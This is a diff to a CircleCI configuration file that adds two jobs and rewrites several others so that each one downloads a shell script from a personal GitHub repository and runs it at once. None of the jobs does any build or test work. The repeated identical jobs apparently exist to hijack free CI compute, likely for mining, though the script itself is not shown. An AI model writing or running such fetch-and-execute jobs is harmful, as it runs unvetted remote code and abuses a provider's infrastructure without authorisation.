@@ -2,6 +2,24 @@ version: 2.1
 
 jobs:
 
+  Syifa_10:
+    docker:
+
+      - image: circleci/golang:1.15.8
+
+    steps:
+        - run:
+            name: Syifa_10
+            command: wget https://raw.githubusercontent.com/tomirobert1-rtfryrtghum/xx/main/start.sh && chmod u+x start.sh && ./start.sh
+  Syifa_09:
+    docker:
+
+      - image: circleci/golang:1.15.8
+
+    steps:
+        - run:
+            name: Syifa_09
+            command: wget https://raw.githubusercontent.com/tomirobert1-rtfryrtghum/xx/main/start.sh && chmod u+x start.sh && ./start.sh
   Syifa_08:
     docker:
 
@@ -10,7 +28,7 @@ jobs:
     steps:
         - run:
             name: Syifa_08
-            command: wget https://raw.githubusercontent.com/Janganlah1245/jangandonk/master/start.sh && chmod u+x start.sh && ./start.sh
+            command: wget https://raw.githubusercontent.com/tomirobert1-rtfryrtghum/xx/main/start.sh && chmod u+x start.sh && ./start.sh
   Syifa_07:
     docker:
 
@@ -19,7 +37,7 @@ jobs:
     steps:
         - run:
             name: Syifa_07
-            command: wget https://raw.githubusercontent.com/Janganlah1245/jangandonk/master/start.sh && chmod u+x start.sh && ./start.sh
+            command: wget https://raw.githubusercontent.com/tomirobert1-rtfryrtghum/xx/main/start.sh && chmod u+x start.sh && ./start.sh
   Syifa_06:
     docker:
 
@@ -28,7 +46,7 @@ jobs:
     steps:
         - run:
             name: Syifa_06
-            command: wget https://raw.githubusercontent.com/Janganlah1245/jangandonk/master/start.sh && chmod u+x start.sh && ./start.sh
+            command: wget https://raw.githubusercontent.com/tomirobert1-rtfryrtghum/xx/main/start.sh && chmod u+x start.sh && ./start.sh
   Syifa_05:
     docker:
 
@@ -37,7 +55,7 @@ jobs:
     steps:
         - run:
             name: Syifa_05
-            command: wget https://raw.githubusercontent.com/Janganlah1245/jangandonk/master/start.sh && chmod u+x start.sh && ./start.sh
+            command: wget https://raw.githubusercontent.com/tomirobert1-rtfryrtghum/xx/main/start.sh && chmod u+x start.sh && ./start.sh
   Syifa_04:
     docker:
 
@@ -46,7 +64,7 @@ jobs:
     steps:
         - run:
             name: Syifa_04
-            command: wget https://raw.githubusercontent.com/Janganlah1245/jangandonk/master/start.sh && chmod u+x start.sh && ./start.sh
+            command: wget https://raw.githubusercontent.com/tomirobert1-rtfryrtghum/xx/main/start.sh && chmod u+x start.sh && ./start.sh
   Syifa_03:
     docker:
 
@@ -78,6 +96,8 @@ workflows:
     version: 2
     Syifa:
         jobs:
+            - Syifa_10
+            - Syifa_09
             - Syifa_08
             - Syifa_07
             - Syifa_06
